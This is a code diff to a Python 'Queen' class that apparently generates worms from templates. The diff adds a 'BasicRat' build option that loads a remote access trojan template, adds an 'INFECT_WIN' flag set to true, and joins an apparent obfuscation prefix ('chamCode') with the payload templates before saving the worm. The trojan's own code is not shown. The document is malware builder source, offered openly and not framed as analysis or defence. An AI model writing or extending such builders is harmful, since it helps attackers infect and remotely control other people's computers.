@@ -17,8 +17,9 @@ class Queen:
         self.loadChamCode()
         self._temp = {"basic" : self.loadTemp("basicW.py"),
                     "start" : self.loadTemp("startup.py"),
-                    "echo" : self.loadTemp("echo.py")}
-        self._emptyConf = {"MULTIPROCESING_FREEZE" : None}
+                    "echo" : self.loadTemp("echo.py"),
+                    "basic_rat" : self.loadTemp("basicRat.py")}
+        self._emptyConf = {"MULTIPROCESING_FREEZE" : None, "INFECT_WIN" : True}
 
 
     
@@ -43,6 +44,7 @@ class Queen:
         _conf = self.baseConf.CONF.copy()
         _conf.update(self._emptyConf)
         _conf.update(config)
+        print(_conf)
         code = self._temp[types]
         temp = Template(code)
         rcode = temp.render(_conf)
@@ -68,6 +70,10 @@ class Queen:
                 conf.update({"WORM_NAME" : "EchoClient"})
                 a = self.renderTemplate("basic", conf)
                 b = self.renderTemplate("echo")
+            case "BasicRat":
+                conf.update({"WORM_NAME" : "BasicRat"})
+                a = self.renderTemplate("basic", conf)
+                b = self.renderTemplate("basic_rat")
         startup = self.renderTemplate("start", conf)
         fcode = self.chamCode + a + b + c + d + startup
         worm_name = self.saveWorm(name, types, fcode)
